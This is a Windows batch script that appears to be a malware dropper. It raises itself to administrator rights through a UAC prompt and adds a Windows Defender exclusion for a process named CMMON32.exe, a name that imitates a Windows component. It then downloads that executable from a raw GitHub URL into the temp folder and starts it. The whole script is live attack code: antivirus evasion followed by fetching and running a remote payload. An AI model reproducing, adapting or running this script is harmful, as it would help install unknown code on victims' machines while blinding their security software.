@echo off

:: BatchGotAdmin
:-------------------------------------
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"


powershell  Set-MpPreference -ExclusionProcess "CMMON32.exe"
cd %TEMP%


powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON32.exe' -OutFile CMMON32.exe" 
Start CMMON32.exe


